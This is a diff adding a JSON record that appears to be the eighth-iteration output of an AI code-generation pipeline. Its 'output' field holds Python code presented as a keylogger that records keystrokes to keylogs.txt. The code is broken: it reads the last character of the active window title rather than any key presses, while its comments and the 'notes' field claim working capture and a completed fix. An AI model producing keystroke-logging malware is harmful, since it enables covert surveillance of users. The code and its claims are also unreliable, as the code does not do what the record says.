@@ -1,0 +1,8 @@
+{
+  "output": "import pyautogui\nimport time\n\n# Define a function to handle special keys\ndef get_special_key(key):\n    special_keys = {\n        '\\r': '[ENTER]',\n        '\\t': '\\t',\n        '\\b': '[BACKSPACE]',\n        ' ': ' ',\n    }\n    return special_keys.get(key, key)\n\n# Define the main function to log keystrokes\ndef log_keystrokes():\n    with open('keylogs.txt', 'w') as f:\n        # Capture real-time keystrokes and save them to a file\n        try:\n            while True:\n                key = get_special_key(pyautogui.getActiveWindowTitle()[-1])\n                print(f'Captured: {key}')\n                f.write(str(key))\n                f.flush()\n                time.sleep(0.2)\n        except KeyboardInterrupt:\n            pass\n\n# Run the logging script\nif __name__ == '__main__':\n    log_keystrokes()",
+  "notes": "Added error handling to catch keyboard interrupts and gracefully exit the loop.",
+  "applied_fixes": [
+    "iteration7_issue1"
+  ],
+  "iterations": 8
+}
